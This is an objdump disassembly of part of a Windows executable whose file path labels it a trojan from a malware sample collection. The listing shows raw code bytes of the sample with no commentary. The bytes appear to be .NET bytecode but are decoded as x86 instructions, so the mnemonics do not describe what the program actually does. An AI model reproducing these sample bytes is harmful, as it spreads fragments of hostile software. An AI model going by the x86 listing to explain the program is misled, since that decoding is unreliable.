
malware_samples/trojan/bf47fcdff4292e8b888e25d14e731f604267f82f1a05fa41607f990ab9289e3c.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	d0 80 01 00 00 00    	rolb   $1,0x1(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 50 f6 00    	add    %al,0xf65000
  402013:	00 4c 8a 00          	add    %cl,0x0(%edx,%ecx,4)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 02                	add    %al,(%edx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
  402020:	58                   	pop    %eax
  402021:	9a 00 00 f7 5b 00 00 	lcall  $0x0,$0x5bf70000
	...
  402050:	1e                   	push   %ds
  402051:	17                   	pop    %ss
  402052:	28 92 00 00 06 2a    	sub    %dl,0x2a060000(%edx)
  402058:	2e 73 06             	jae,pn 0x402061
  40205b:	00 00                	add    %al,(%eax)
  40205d:	06                   	push   %es
  40205e:	80 02 00             	addb   $0x0,(%edx)
  402061:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402064:	1e                   	push   %ds
  402065:	02 28                	add    (%eax),%ch
  402067:	3c 00                	cmp    $0x0,%al
  402069:	00 0a                	add    %cl,(%edx)
  40206b:	2a 2e                	sub    (%esi),%ch
  40206d:	7e 01                	jle    0x402070
  40206f:	00 00                	add    %al,(%eax)
  402071:	04 6f                	add    $0x6f,%al
  402073:	4d                   	dec    %ebp
  402074:	00 00                	add    %al,(%eax)
  402076:	06                   	push   %es
  402077:	2a 36                	sub    (%esi),%dh
  402079:	02 7c 06 00          	add    0x0(%esi,%eax,1),%bh
  40207d:	00 04 03             	add    %al,(%ebx,%eax,1)
  402080:	28 4a 00             	sub    %cl,0x0(%edx)
  402083:	00 0a                	add    %cl,(%edx)
  402085:	2a 1e                	sub    (%esi),%bl
  402087:	02 7b 09             	add    0x9(%ebx),%bh
  40208a:	00 00                	add    %al,(%eax)
  40208c:	04 2a                	add    $0x2a,%al
  40208e:	22 02                	and    (%edx),%al
  402090:	03 7d 09             	add    0x9(%ebp),%edi
  402093:	00 00                	add    %al,(%eax)
  402095:	04 2a                	add    $0x2a,%al
  402097:	36 02 7b 08          	add    %ss:0x8(%ebx),%bh
  40209b:	00 00                	add    %al,(%eax)
  40209d:	04 03                	add    $0x3,%al
  40209f:	6f                   	outsl  %ds:(%esi),(%dx)
  4020a0:	4f                   	dec    %edi
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	06                   	push   %es
  4020a4:	2a 1e                	sub    (%esi),%bl
  4020a6:	02 7b 0a             	add    0xa(%ebx),%bh
  4020a9:	00 00                	add    %al,(%eax)
  4020ab:	04 2a                	add    $0x2a,%al
  4020ad:	1e                   	push   %ds
  4020ae:	02 7b 0b             	add    0xb(%ebx),%bh
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	04 2a                	add    $0x2a,%al
  4020b5:	1e                   	push   %ds
  4020b6:	02 7b 0c             	add    0xc(%ebx),%bh
  4020b9:	00 00                	add    %al,(%eax)
  4020bb:	04 2a                	add    $0x2a,%al
  4020bd:	1e                   	push   %ds
  4020be:	02 7b 0d             	add    0xd(%ebx),%bh
  4020c1:	00 00                	add    %al,(%eax)
  4020c3:	04 2a                	add    $0x2a,%al
  4020c5:	1e                   	push   %ds
  4020c6:	02 7b 0e             	add    0xe(%ebx),%bh
  4020c9:	00 00                	add    %al,(%eax)
  4020cb:	04 2a                	add    $0x2a,%al
  4020cd:	1e                   	push   %ds
  4020ce:	02 7b 0f             	add    0xf(%ebx),%bh
  4020d1:	00 00                	add    %al,(%eax)
  4020d3:	04 2a                	add    $0x2a,%al
  4020d5:	1e                   	push   %ds
  4020d6:	02 7b 10             	add    0x10(%ebx),%bh
  4020d9:	00 00                	add    %al,(%eax)
  4020db:	04 2a                	add    $0x2a,%al
  4020dd:	1e                   	push   %ds
  4020de:	02 7b 11             	add    0x11(%ebx),%bh
  4020e1:	00 00                	add    %al,(%eax)
  4020e3:	04 2a                	add    $0x2a,%al
  4020e5:	1e                   	push   %ds
  4020e6:	02 7b 12             	add    0x12(%ebx),%bh
  4020e9:	00 00                	add    %al,(%eax)
  4020eb:	04 2a                	add    $0x2a,%al
  4020ed:	1e                   	push   %ds
  4020ee:	02 7b 13             	add    0x13(%ebx),%bh
  4020f1:	00 00                	add    %al,(%eax)
  4020f3:	04 2a                	add    $0x2a,%al
  4020f5:	1e                   	push   %ds
  4020f6:	02 7b 14             	add    0x14(%ebx),%bh
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	04 2a                	add    $0x2a,%al
  4020fd:	1e                   	push   %ds
  4020fe:	02 7b 15             	add    0x15(%ebx),%bh
  402101:	00 00                	add    %al,(%eax)
  402103:	04 2a                	add    $0x2a,%al
  402105:	1e                   	push   %ds
  402106:	02 7b 16             	add    0x16(%ebx),%bh
  402109:	00 00                	add    %al,(%eax)
  40210b:	04 2a                	add    $0x2a,%al
  40210d:	1e                   	push   %ds
  40210e:	02 7b 17             	add    0x17(%ebx),%bh
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 7b 18             	add    0x18(%ebx),%bh
  402119:	00 00                	add    %al,(%eax)
  40211b:	04 2a                	add    $0x2a,%al
  40211d:	1e                   	push   %ds
  40211e:	02 7b 19             	add    0x19(%ebx),%bh
  402121:	00 00                	add    %al,(%eax)
  402123:	04 2a                	add    $0x2a,%al
  402125:	1e                   	push   %ds
  402126:	02 7b 1a             	add    0x1a(%ebx),%bh
  402129:	00 00                	add    %al,(%eax)
  40212b:	04 2a                	add    $0x2a,%al
  40212d:	1e                   	push   %ds
  40212e:	02 7b 1b             	add    0x1b(%ebx),%bh
  402131:	00 00                	add    %al,(%eax)
  402133:	04 2a                	add    $0x2a,%al
  402135:	1e                   	push   %ds
  402136:	02 7b 1c             	add    0x1c(%ebx),%bh
  402139:	00 00                	add    %al,(%eax)
  40213b:	04 2a                	add    $0x2a,%al
  40213d:	1e                   	push   %ds
  40213e:	02 7b 1d             	add    0x1d(%ebx),%bh
  402141:	00 00                	add    %al,(%eax)
  402143:	04 2a                	add    $0x2a,%al
  402145:	1e                   	push   %ds
  402146:	02 7b 1e             	add    0x1e(%ebx),%bh
  402149:	00 00                	add    %al,(%eax)
  40214b:	04 2a                	add    $0x2a,%al
  40214d:	1e                   	push   %ds
  40214e:	02 7b 1f             	add    0x1f(%ebx),%bh
  402151:	00 00                	add    %al,(%eax)
  402153:	04 2a                	add    $0x2a,%al
  402155:	1e                   	push   %ds
  402156:	02 7b 20             	add    0x20(%ebx),%bh
  402159:	00 00                	add    %al,(%eax)
  40215b:	04 2a                	add    $0x2a,%al
  40215d:	1e                   	push   %ds
  40215e:	02 7b 21             	add    0x21(%ebx),%bh
  402161:	00 00                	add    %al,(%eax)
  402163:	04 2a                	add    $0x2a,%al
  402165:	1e                   	push   %ds
  402166:	02 7b 3e             	add    0x3e(%ebx),%bh
  402169:	00 00                	add    %al,(%eax)
  40216b:	04 2a                	add    $0x2a,%al
  40216d:	1e                   	push   %ds
  40216e:	02 7b 3f             	add    0x3f(%ebx),%bh
  402171:	00 00                	add    %al,(%eax)
  402173:	04 2a                	add    $0x2a,%al
  402175:	96                   	xchg   %eax,%esi
  402176:	28 56 00             	sub    %dl,0x0(%esi)
  402179:	00 0a                	add    %cl,(%edx)
  40217b:	03 6f 57             	add    0x57(%edi),%ebp
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 28                	or     (%eax),%ch
  402182:	58                   	pop    %eax
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 72 27             	or     0x27(%edx),%dh
  402188:	04 00                	add    $0x0,%al
  40218a:	70 72                	jo     0x4021fe
  40218c:	9f                   	lahf
  40218d:	03 00                	add    (%eax),%eax
  40218f:	70 6f                	jo     0x402200
  402191:	59                   	pop    %ecx
  402192:	00 00                	add    %al,(%eax)
  402194:	0a 6f 5a             	or     0x5a(%edi),%ch
  402197:	00 00                	add    %al,(%eax)
  402199:	0a 2a                	or     (%edx),%ch
  40219b:	46                   	inc    %esi
  40219c:	7e 3c                	jle    0x4021da
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 02                	add    $0x2,%al
  4021a2:	7b 43                	jnp    0x4021e7
  4021a4:	00 00                	add    %al,(%eax)
  4021a6:	04 6f                	add    $0x6f,%al
  4021a8:	41                   	inc    %ecx
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	06                   	push   %es
  4021ac:	2a 8a 02 7b 44 00    	sub    0x447b02(%edx),%cl
  4021b2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4021b5:	b1 00                	mov    $0x0,%cl
  4021b7:	00 0a                	add    %cl,(%edx)
  4021b9:	02 7b 45             	add    0x45(%ebx),%bh
  4021bc:	00 00                	add    %al,(%eax)
  4021be:	04 6f                	add    $0x6f,%al
  4021c0:	b2 00                	mov    $0x0,%dl
  4021c2:	00 0a                	add    %cl,(%edx)
  4021c4:	02 7b 45             	add    0x45(%ebx),%bh
  4021c7:	00 00                	add    %al,(%eax)
  4021c9:	04 6f                	add    $0x6f,%al
  4021cb:	b1 00                	mov    $0x0,%cl
  4021cd:	00 0a                	add    %cl,(%edx)
  4021cf:	2a 62 7e             	sub    0x7e(%edx),%ah
  4021d2:	46                   	inc    %esi
  4021d3:	00 00                	add    %al,(%eax)
  4021d5:	04 2c                	add    $0x2c,%al
  4021d7:	10 7e 46             	adc    %bh,0x46(%esi)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	04 6f                	add    $0x6f,%al
  4021de:	c3                   	ret
  4021df:	00 00                	add    %al,(%eax)
  4021e1:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021e4:	46                   	inc    %esi
  4021e5:	00 00                	add    %al,(%eax)
  4021e7:	04 2a                	add    $0x2a,%al
  4021e9:	62 02                	bound  %eax,(%edx)
  4021eb:	16                   	push   %ss
  4021ec:	7d 48                	jge    0x402236
  4021ee:	00 00                	add    %al,(%eax)
  4021f0:	04 02                	add    $0x2,%al
  4021f2:	7b 47                	jnp    0x40223b
  4021f4:	00 00                	add    %al,(%eax)
  4021f6:	04 25                	add    $0x25,%al
  4021f8:	2d 02 26 2a 28       	sub    $0x282a2602,%eax
  4021fd:	c4 00                	les    (%eax),%eax
  4021ff:	00 0a                	add    %cl,(%edx)
  402201:	2a 36                	sub    (%esi),%dh
  402203:	02 7c 4a 00          	add    0x0(%edx,%ecx,2),%bh
  402207:	00 04 03             	add    %al,(%ebx,%eax,1)
  40220a:	28 4a 00             	sub    %cl,0x0(%edx)
  40220d:	00 0a                	add    %cl,(%edx)
  40220f:	2a 36                	sub    (%esi),%dh
  402211:	02 7c 4f 00          	add    0x0(%edi,%ecx,2),%bh
  402215:	00 04 03             	add    %al,(%ebx,%eax,1)
  402218:	28 4a 00             	sub    %cl,0x0(%edx)
  40221b:	00 0a                	add    %cl,(%edx)
  40221d:	2a 1e                	sub    (%esi),%bl
  40221f:	02 7b 5a             	add    0x5a(%ebx),%bh
  402222:	00 00                	add    %al,(%eax)
  402224:	04 2a                	add    $0x2a,%al
  402226:	1e                   	push   %ds
  402227:	02 7b 5b             	add    0x5b(%ebx),%bh
  40222a:	00 00                	add    %al,(%eax)
  40222c:	04 2a                	add    $0x2a,%al
  40222e:	32 02                	xor    (%edx),%al
  402230:	28 49 00             	sub    %cl,0x0(%ecx)
  402233:	00 06                	add    %al,(%esi)
  402235:	6f                   	outsl  %ds:(%esi),(%dx)
  402236:	6c                   	insb   (%dx),%es:(%edi)
  402237:	00 00                	add    %al,(%eax)
  402239:	06                   	push   %es
  40223a:	2a 7e 02             	sub    0x2(%esi),%bh
  40223d:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402240:	00 0a                	add    %cl,(%edx)
  402242:	02 02                	add    (%edx),%al
  402244:	73 2b                	jae    0x402271
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	7d 5b                	jge    0x4022a6
  40224b:	00 00                	add    %al,(%eax)
  40224d:	04 02                	add    $0x2,%al
  40224f:	02 73 6e             	add    0x6e(%ebx),%dh
  402252:	00 00                	add    %al,(%eax)
  402254:	06                   	push   %es
  402255:	7d 5a                	jge    0x4022b1
  402257:	00 00                	add    %al,(%eax)
  402259:	04 2a                	add    $0x2a,%al
  40225b:	32 02                	xor    (%edx),%al
  40225d:	28 49 00             	sub    %cl,0x0(%ecx)
  402260:	00 06                	add    %al,(%esi)
  402262:	6f                   	outsl  %ds:(%esi),(%dx)
  402263:	6f                   	outsl  %ds:(%esi),(%dx)
  402264:	00 00                	add    %al,(%eax)
  402266:	06                   	push   %es
  402267:	2a 32                	sub    (%edx),%dh
  402269:	02 28                	add    (%eax),%ch
  40226b:	49                   	dec    %ecx
  40226c:	00 00                	add    %al,(%eax)
  40226e:	06                   	push   %es
  40226f:	6f                   	outsl  %ds:(%esi),(%dx)
  402270:	70 00                	jo     0x402272
  402272:	00 06                	add    %al,(%esi)
  402274:	2a 3a                	sub    (%edx),%bh
  402276:	02 28                	add    (%eax),%ch
  402278:	49                   	dec    %ecx
  402279:	00 00                	add    %al,(%eax)
  40227b:	06                   	push   %es
  40227c:	03 6f 77             	add    0x77(%edi),%ebp
  40227f:	00 00                	add    %al,(%eax)
  402281:	06                   	push   %es
  402282:	26 2a 56 02          	sub    %es:0x2(%esi),%dl
  402286:	28 4b 00             	sub    %cl,0x0(%ebx)
  402289:	00 06                	add    %al,(%esi)
  40228b:	18 2e                	sbb    %ch,(%esi)
  40228d:	0a 02                	or     (%edx),%al
  40228f:	28 4b 00             	sub    %cl,0x0(%ebx)
  402292:	00 06                	add    %al,(%esi)
  402294:	19 fe                	sbb    %edi,%esi
  402296:	01 2a                	add    %ebp,(%edx)
  402298:	17                   	pop    %ss
  402299:	2a ae 7e 5c 00 00    	sub    0x5c7e(%esi),%ch
  40229f:	04 2d                	add    $0x2d,%al
  4022a1:	1e                   	push   %ds
  4022a2:	72 ee                	jb     0x402292
  4022a4:	2d 00 70 d0 10       	sub    $0x10d07000,%eax
  4022a9:	00 00                	add    %al,(%eax)
  4022ab:	02 28                	add    (%eax),%ch
  4022ad:	d9 00                	flds   (%eax)
  4022af:	00 0a                	add    %cl,(%edx)
  4022b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b2:	da 00                	fiaddl (%eax)
  4022b4:	00 0a                	add    %cl,(%edx)
  4022b6:	73 db                	jae    0x402293
  4022b8:	00 00                	add    %al,(%eax)
  4022ba:	0a 80 5c 00 00 04    	or     0x400005c(%eax),%al
  4022c0:	7e 5c                	jle    0x40231e
  4022c2:	00 00                	add    %al,(%eax)
  4022c4:	04 2a                	add    $0x2a,%al
  4022c6:	1a 7e 5d             	sbb    0x5d(%esi),%bh
  4022c9:	00 00                	add    %al,(%eax)
  4022cb:	04 2a                	add    $0x2a,%al
  4022cd:	1e                   	push   %ds
  4022ce:	02 80 5d 00 00 04    	add    0x400005d(%eax),%al
  4022d4:	2a 1a                	sub    (%edx),%bl
  4022d6:	7e 5e                	jle    0x402336
  4022d8:	00 00                	add    %al,(%eax)
  4022da:	04 2a                	add    $0x2a,%al
  4022dc:	1e                   	push   %ds
  4022dd:	02 28                	add    (%eax),%ch
  4022df:	dc 00                	faddl  (%eax)
  4022e1:	00 0a                	add    %cl,(%edx)
  4022e3:	2a 56 73             	sub    0x73(%esi),%dl
  4022e6:	56                   	push   %esi
  4022e7:	00 00                	add    %al,(%eax)
  4022e9:	06                   	push   %es
  4022ea:	28 dd                	sub    %bl,%ch
  4022ec:	00 00                	add    %al,(%eax)
  4022ee:	0a 74 11 00          	or     0x0(%ecx,%edx,1),%dh
  4022f2:	00 02                	add    %al,(%edx)
  4022f4:	80 5e 00 00          	sbbb   $0x0,0x0(%esi)
  4022f8:	04 2a                	add    $0x2a,%al
  4022fa:	ce                   	into
  4022fb:	02 28                	add    (%eax),%ch
  4022fd:	3c 00                	cmp    $0x0,%al
  4022ff:	00 0a                	add    %cl,(%edx)
  402301:	02 03                	add    (%ebx),%al
  402303:	25 2d 0c 26 72       	and    $0x72260c2d,%eax
  402308:	26 2e 00 70 73       	es add %dh,%cs:0x73(%eax)
  40230d:	52                   	push   %edx
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 7a 7d             	or     0x7d(%edx),%bh
  402313:	5f                   	pop    %edi
  402314:	00 00                	add    %al,(%eax)
  402316:	04 02                	add    $0x2,%al
  402318:	04 25                	add    $0x25,%al
  40231a:	2d 0c 26 72 3a       	sub    $0x3a72260c,%eax
  40231f:	2e 00 70 73          	add    %dh,%cs:0x73(%eax)
  402323:	52                   	push   %edx
  402324:	00 00                	add    %al,(%eax)
  402326:	0a 7a 7d             	or     0x7d(%edx),%bh
  402329:	60                   	pusha
  40232a:	00 00                	add    %al,(%eax)
  40232c:	04 2a                	add    $0x2a,%al
  40232e:	1e                   	push   %ds
  40232f:	02 28                	add    (%eax),%ch
  402331:	5c                   	pop    %esp
  402332:	00 00                	add    %al,(%eax)
  402334:	06                   	push   %es
  402335:	2a 36                	sub    (%esi),%dh
  402337:	02 7c 64 00          	add    0x0(%esp,%eiz,2),%bh
  40233b:	00 04 03             	add    %al,(%ebx,%eax,1)
  40233e:	28 4a 00             	sub    %cl,0x0(%edx)
  402341:	00 0a                	add    %cl,(%edx)
  402343:	2a 36                	sub    (%esi),%dh
  402345:	02 7c 6b 00          	add    0x0(%ebx,%ebp,2),%bh
  402349:	00 04 03             	add    %al,(%ebx,%eax,1)
  40234c:	28 4a 00             	sub    %cl,0x0(%edx)
  40234f:	00 0a                	add    %cl,(%edx)
  402351:	2a aa 02 17 17 73    	sub    0x73171702(%edx),%ch
  402357:	f3 00 00             	repz add %al,(%eax)
  40235a:	0a 7d 74             	or     0x74(%ebp),%bh
  40235d:	00 00                	add    %al,(%eax)
  40235f:	04 02                	add    $0x2,%al
  402361:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402364:	00 0a                	add    %cl,(%edx)
  402366:	02 03                	add    (%ebx),%al
  402368:	25 2d 0c 26 72       	and    $0x72260c2d,%eax
  40236d:	26 2e 00 70 73       	es add %dh,%cs:0x73(%eax)
  402372:	52                   	push   %edx
  402373:	00 00                	add    %al,(%eax)
  402375:	0a 7a 7d             	or     0x7d(%edx),%bh
  402378:	73 00                	jae    0x40237a
  40237a:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40237d:	36 02 7c 77 00       	add    %ss:0x0(%edi,%esi,2),%bh
  402382:	00 04 03             	add    %al,(%ebx,%eax,1)
  402385:	28 4a 00             	sub    %cl,0x0(%edx)
  402388:	00 0a                	add    %cl,(%edx)
  40238a:	2a 1e                	sub    (%esi),%bl
  40238c:	02 7b 8c             	add    -0x74(%ebx),%bh
  40238f:	00 00                	add    %al,(%eax)
  402391:	04 2a                	add    $0x2a,%al
  402393:	22 02                	and    (%edx),%al
  402395:	03 7d 8c             	add    -0x74(%ebp),%edi
  402398:	00 00                	add    %al,(%eax)
  40239a:	04 2a                	add    $0x2a,%al
  40239c:	1e                   	push   %ds
  40239d:	02 7b 8d             	add    -0x73(%ebx),%bh
  4023a0:	00 00                	add    %al,(%eax)
  4023a2:	04 2a                	add    $0x2a,%al
  4023a4:	22 02                	and    (%edx),%al
  4023a6:	03 7d 8d             	add    -0x73(%ebp),%edi
  4023a9:	00 00                	add    %al,(%eax)
  4023ab:	04 2a                	add    $0x2a,%al
  4023ad:	1e                   	push   %ds
  4023ae:	02 7b 8e             	add    -0x72(%ebx),%bh
  4023b1:	00 00                	add    %al,(%eax)
  4023b3:	04 2a                	add    $0x2a,%al
  4023b5:	22 02                	and    (%edx),%al
  4023b7:	03 7d 8e             	add    -0x72(%ebp),%edi
  4023ba:	00 00                	add    %al,(%eax)
  4023bc:	04 2a                	add    $0x2a,%al
  4023be:	3a 02                	cmp    (%edx),%al
  4023c0:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4023c3:	00 0a                	add    %cl,(%edx)
  4023c5:	02 03                	add    (%ebx),%al
  4023c7:	7d 87                	jge    0x402350
  4023c9:	00 00                	add    %al,(%eax)
  4023cb:	04 2a                	add    $0x2a,%al
  4023cd:	e6 02                	out    %al,$0x2
  4023cf:	7b 89                	jnp    0x40235a
  4023d1:	00 00                	add    %al,(%eax)
  4023d3:	04 2c                	add    $0x2c,%al
  4023d5:	0e                   	push   %cs
  4023d6:	02 7b 89             	add    -0x77(%ebx),%bh
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	04 6f                	add    $0x6f,%al
  4023dd:	fc                   	cld
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	0a 2d 01 2a 02 73    	or     0x73022a01,%ch
  4023e6:	fd                   	std
  4023e7:	00 00                	add    %al,(%eax)
  4023e9:	0a 7d 88             	or     -0x78(%ebp),%bh
  4023ec:	00 00                	add    %al,(%eax)
  4023ee:	04 02                	add    $0x2,%al
  4023f0:	02 fe                	add    %dh,%bh
  4023f2:	06                   	push   %es
  4023f3:	7a 00                	jp     0x4023f5
  4023f5:	00 06                	add    %al,(%esi)
  4023f7:	73 1f                	jae    0x402418
  4023f9:	00 00                	add    %al,(%eax)
  4023fb:	0a 28                	or     (%eax),%ch
  4023fd:	20 00                	and    %al,(%eax)
  4023ff:	00 0a                	add    %cl,(%edx)
  402401:	7d 89                	jge    0x40238c
  402403:	00 00                	add    %al,(%eax)
  402405:	04 2a                	add    $0x2a,%al
  402407:	9a 02 1a 28 6d 00 00 	lcall  $0x0,$0x6d281a02
  40240e:	06                   	push   %es
  40240f:	02 7b 88             	add    -0x78(%ebx),%bh
  402412:	00 00                	add    %al,(%eax)
  402414:	04 25                	add    $0x25,%al
  402416:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  40241b:	28 fe                	sub    %bh,%dh
  40241d:	00 00                	add    %al,(%eax)
  40241f:	0a 02                	or     (%edx),%al
  402421:	28 75 00             	sub    %dh,0x0(%ebp)
  402424:	00 06                	add    %al,(%esi)
  402426:	02 16                	add    (%esi),%dl
  402428:	28 6d 00             	sub    %ch,0x0(%ebp)
  40242b:	00 06                	add    %al,(%esi)
  40242d:	2a 4a 02             	sub    0x2(%edx),%cl
  402430:	02 7b 88             	add    -0x78(%ebx),%bh
  402433:	00 00                	add    %al,(%eax)
  402435:	04 6f                	add    $0x6f,%al
  402437:	eb 00                	jmp    0x402439
  402439:	00 0a                	add    %cl,(%edx)
  40243b:	28 71 00             	sub    %dh,0x0(%ecx)
  40243e:	00 06                	add    %al,(%esi)
  402440:	2a 36                	sub    (%esi),%dh
  402442:	02 7c 93 00          	add    0x0(%ebx,%edx,4),%bh
  402446:	00 04 03             	add    %al,(%ebx,%eax,1)
  402449:	28 4a 00             	sub    %cl,0x0(%edx)
  40244c:	00 0a                	add    %cl,(%edx)
  40244e:	2a 36                	sub    (%esi),%dh
  402450:	02 7c 9e 00          	add    0x0(%esi,%ebx,4),%bh
  402454:	00 04 03             	add    %al,(%ebx,%eax,1)
  402457:	28 4a 00             	sub    %cl,0x0(%edx)
  40245a:	00 0a                	add    %cl,(%edx)
  40245c:	2a 2e                	sub    (%esi),%ch
  40245e:	73 82                	jae    0x4023e2
  402460:	00 00                	add    %al,(%eax)
  402462:	06                   	push   %es
  402463:	80 a0 00 00 04 2a 36 	andb   $0x36,0x2a040000(%eax)
  40246a:	03 6f 19             	add    0x19(%edi),%ebp
  40246d:	01 00                	add    %eax,(%eax)
  40246f:	0a 18                	or     (%eax),%bl
  402471:	2e 02 17             	add    %cs:(%edi),%dl
  402474:	2a 15 2a 0a 17 2a    	sub    0x2a170a2a,%dl
  40247a:	36 02 7c a4 00       	add    %ss:0x0(%esp,%eiz,4),%bh
  40247f:	00 04 03             	add    %al,(%ebx,%eax,1)
  402482:	28 33                	sub    %dh,(%ebx)
  402484:	01 00                	add    %eax,(%eax)
  402486:	0a 2a                	or     (%edx),%ch
  402488:	42                   	inc    %edx
  402489:	02 2d 06 7e 35 01    	add    0x1357e06,%ch
  40248f:	00 0a                	add    %cl,(%edx)
  402491:	2a 02                	sub    (%edx),%al
  402493:	6f                   	outsl  %ds:(%esi),(%dx)
  402494:	36 01 00             	add    %eax,%ss:(%eax)
  402497:	0a 2a                	or     (%edx),%ch
  402499:	00 00                	add    %al,(%eax)
  40249b:	00 1b                	add    %bl,(%ebx)
  40249d:	30 02                	xor    %al,(%edx)
  40249f:	00 99 00 00 00 00    	add    %bl,0x0(%ecx)
  4024a5:	00 00                	add    %al,(%eax)
  4024a7:	00 28                	add    %ch,(%eax)
  4024a9:	19 00                	sbb    %eax,(%eax)
  4024ab:	00 0a                	add    %cl,(%edx)
  4024ad:	16                   	push   %ss
  4024ae:	28 1a                	sub    %bl,(%edx)
  4024b0:	00 00                	add    %al,(%eax)
  4024b2:	0a 7e 27             	or     0x27(%esi),%bh
  4024b5:	00 00                	add    %al,(%eax)
  4024b7:	04 20                	add    $0x20,%al
  4024b9:	e8 03 00 00 5a       	call   0x5a4024c1
  4024be:	28 1b                	sub    %bl,(%ebx)
  4024c0:	00 00                	add    %al,(%eax)
  4024c2:	0a 7e 29             	or     0x29(%esi),%bh
  4024c5:	00 00                	add    %al,(%eax)
  4024c7:	04 2c                	add    $0x2c,%al
  4024c9:	05 28 3b 00 00       	add    $0x3b28,%eax
  4024ce:	06                   	push   %es
  4024cf:	28 3e                	sub    %bh,(%esi)
  4024d1:	00 00                	add    %al,(%eax)
  4024d3:	06                   	push   %es
  4024d4:	2d 06 16 28 1c       	sub    $0x1c281606,%eax
  4024d9:	00 00                	add    %al,(%eax)
  4024db:	0a 00                	or     (%eax),%al
  4024dd:	73 4c                	jae    0x40252b
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	06                   	push   %es
  4024e2:	80 01 00             	addb   $0x0,(%ecx)
  4024e5:	00 04 de             	add    %al,(%esi,%ebx,8)
  4024e8:	03 26                	add    (%esi),%esp
  4024ea:	de 54 7e 03          	ficoms 0x3(%esi,%edi,2)
  4024ee:	00 00                	add    %al,(%eax)
  4024f0:	04 25                	add    $0x25,%al
  4024f2:	2d 17 26 7e 02       	sub    $0x27e2617,%eax
  4024f7:	00 00                	add    %al,(%eax)
  4024f9:	04 fe                	add    $0xfe,%al
  4024fb:	06                   	push   %es
  4024fc:	07                   	pop    %es
  4024fd:	00 00                	add    %al,(%eax)
  4024ff:	06                   	push   %es
  402500:	73 1d                	jae    0x40251f
  402502:	00 00                	add    %al,(%eax)
  402504:	0a 25 80 03 00 00    	or     0x380,%ah
  40250a:	04 28                	add    $0x28,%al
  40250c:	1e                   	push   %ds
  40250d:	00 00                	add    %al,(%eax)
  40250f:	0a 26                	or     (%esi),%ah
  402511:	7e 04                	jle    0x402517
  402513:	00 00                	add    %al,(%eax)
  402515:	04 25                	add    $0x25,%al
  402517:	2d 17 26 7e 02       	sub    $0x27e2617,%eax
  40251c:	00 00                	add    %al,(%eax)
  40251e:	04 fe                	add    $0xfe,%al
  402520:	06                   	push   %es
  402521:	08 00                	or     %al,(%eax)
  402523:	00 06                	add    %al,(%esi)
  402525:	73 1f                	jae    0x402546
  402527:	00 00                	add    %al,(%eax)
  402529:	0a 25 80 04 00 00    	or     0x480,%ah
  40252f:	04 28                	add    $0x28,%al
  402531:	20 00                	and    %al,(%eax)
  402533:	00 0a                	add    %cl,(%edx)
  402535:	26 73 21             	es jae 0x402559
  402538:	00 00                	add    %al,(%eax)
  40253a:	0a 28                	or     (%eax),%ch
  40253c:	22 00                	and    (%eax),%al
  40253e:	00 0a                	add    %cl,(%edx)
  402540:	2a 00                	sub    (%eax),%al
  402542:	00 00                	add    %al,(%eax)
  402544:	01 10                	add    %edx,(%eax)
  402546:	00 00                	add    %al,(%eax)
  402548:	00 00                	add    %al,(%eax)
  40254a:	35 00 0c 41 00       	xor    $0x410c00,%eax
  40254f:	03 02                	add    (%edx),%eax
  402551:	00 00                	add    %al,(%eax)
  402553:	01 1b                	add    %ebx,(%ebx)
  402555:	30 02                	xor    %al,(%edx)
  402557:	00 25 00 00 00 01    	add    %ah,0x1000000
  40255d:	00 00                	add    %al,(%eax)
  40255f:	11 28                	adc    %ebp,(%eax)
  402561:	23 00                	and    (%eax),%eax
  402563:	00 0a                	add    %cl,(%edx)
  402565:	0a 06                	or     (%esi),%al
  402567:	73 24                	jae    0x40258d
  402569:	00 00                	add    %al,(%eax)
  40256b:	0a 20                	or     (%eax),%ah
  40256d:	20 02                	and    %al,(%edx)
  40256f:	00 00                	add    %al,(%eax)
  402571:	6f                   	outsl  %ds:(%esi),(%dx)
  402572:	25 00 00 0a 0b       	and    $0xb0a0000,%eax
  402577:	de 0a                	fimuls (%edx)
  402579:	06                   	push   %es
  40257a:	2c 06                	sub    $0x6,%al
  40257c:	06                   	push   %es
  40257d:	6f                   	outsl  %ds:(%esi),(%dx)
  40257e:	26 00 00             	add    %al,%es:(%eax)
  402581:	0a dc                	or     %ah,%bl
  402583:	07                   	pop    %es
  402584:	2a 00                	sub    (%eax),%al
  402586:	00 00                	add    %al,(%eax)
  402588:	01 10                	add    %edx,(%eax)
  40258a:	00 00                	add    %al,(%eax)
  40258c:	02 00                	add    (%eax),%al
  40258e:	06                   	push   %es
  40258f:	00 13                	add    %dl,(%ebx)
  402591:	19 00                	sbb    %eax,(%eax)
  402593:	0a 00                	or     (%eax),%al
  402595:	00 00                	add    %al,(%eax)
  402597:	00 1b                	add    %bl,(%ebx)
  402599:	30 05 00 a1 01 00    	xor    %al,0x1a100
  40259f:	00 02                	add    %al,(%edx)
